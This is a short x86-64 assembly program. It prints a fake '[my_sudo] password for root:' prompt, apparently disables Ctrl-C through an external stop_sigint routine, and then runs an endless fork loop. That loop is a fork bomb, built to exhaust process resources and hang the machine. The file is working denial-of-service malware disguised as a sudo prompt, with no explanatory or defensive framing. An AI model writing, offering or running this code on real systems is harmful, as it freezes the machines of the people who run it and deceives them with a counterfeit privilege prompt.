bits 64

extern stop_sigint

section .data
    sudo db "[my_sudo] password for root: ", 0
    len_sudo equ $-sudo 

section .text
    global _start
    _start:
        call stop_sigint
        mov rax, 1
        mov rdi, 1
        lea rsi, [rel sudo]
        mov rdx, len_sudo
        syscall

        call fork

        mov rax, 60
        xor rdi, rdi
        syscall

fork:
    mov rax, 57
    syscall

    jmp fork